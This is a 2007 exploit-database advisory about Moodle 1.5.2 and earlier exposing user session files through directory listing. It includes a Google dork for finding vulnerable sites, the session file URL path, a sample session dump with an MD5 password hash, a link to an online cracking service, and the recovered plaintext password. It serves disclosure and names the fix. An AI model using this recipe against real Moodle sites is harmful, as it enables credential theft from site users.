@@ -1,0 +1,68 @@
+--/ INTRODUCTION  --
+
+
+/*
+ *
+ * Advisory           : MOODLE <= 1.5.2 user password read out
+ * Release Date       : 17. March 2007
+ * Application        : Moodle.org is a course management system (CMS) 
+ *		      :	to help educators create effective online learning communities.
+ * Impact             : read out user account passwords in md5 hash
+ * Googledork	      : "inurl:moodledata"
+ * Author             : xSh[at]overclock.ch
+ *
+ */
+
+
+--/    SUMMARY    --
+
+Moodle is a course management system (CMS) - a free, Open Source 
+software package designed using sound pedagogical principles, to 
+help educators create effective online learning communities. You 
+can download and use it on any computer you have handy (including 
+webhosts), yet it can scale from a single-teacher site to a 
+50,000-student University. (www.moodle.org)
+
+
+--/   REPRODUCE   --
+
+The moodle CMS is located at 'www.TARGET.com/moodle' and the moodle
+database at 'www.TARGET.com/moodledata' including uploads, temp and
+session files. We're interested to get the session files, created 
+by each user:
+
+http://www.TARGET.com/moodledata/sessions/
+
+Filename:
+
+sess_280c9fca6458bf24277cf03c45d2a770
+
+Content: (> 2KB)
+
+SESSION|O:6:"object":12:{s:12:"session_test";s:10:"zN0PiMhwWK";s:8:"encoding";
+s:10:"iso-8859-1";s:7:"fromurl";s:69:"http://www.TARGET.com/moodle/mod/forum/
+view.php?id=100";s:10:"logincount";i:1;s:18:"cal_course_referer";i:0;s:15:"cal
+_show_global";b:1;s:15:"cal_show_groups";b:1;s:15:"cal_show_course";b:1;s:13:"
+cal_show_user";b:1;s:17:"cal_courses_shown";a:2:{i:1;b:1;i:9;b:1;}s:15:"cal_u
+sers_shown";s:2:"86";s:14:"fromdiscussion";s:64:"http://www.TARGET.com/moodle/
+course/view.php?id=9";}USER|O:8:"stdClass":94:{i:0;s:2:"86";s:2:"id";s:2:"86";
+i:1;s:5:"email";s:4:"auth";s:5:"email";i:2;s:1:"1";s:9:"confirmed";s:1:"1";i:
+3;s:1:"0";s:12:"policyagreed";s:1:"0";i:4;s:1:"0";s:7:"deleted";s:1:"0";i:5;s:
+33:"victim@target.com";s:8:"username";s:33:"victim@target.com";i:6;s:32:"bb07c
+989b57c25fd7e53395c3e118185";s:8:"password";s:32:"bb07c989b57c25fd7e53395c3e118185";
+i:7;N;s:8:"idnumber";N;i:8;s:9:"Victim";s:9:"firstname";s:9:"Victim";i:9;s:5:
+"Victim";s:8:"lastname";s:5:"Victim";i:10;s:33:"victim@target.com";s:5:"email";
+
+
+In cryptography, MD5 (Message-Digest algorithm 5) is a widely-used cryptographic 
+hash function with a 128-bit hash value. (md5 online crack: http://gdataonline.com)
+
+Password (md5 string) = bb07c989b57c25fd7e53395c3e118185
+Password (plain text) = Claudia
+
+
+--     PATCH     /--
+
+Don't allow Directory listing. There are no other possibilities actually as far as I know.
+
+# milw0rm.com [2007-03-18]
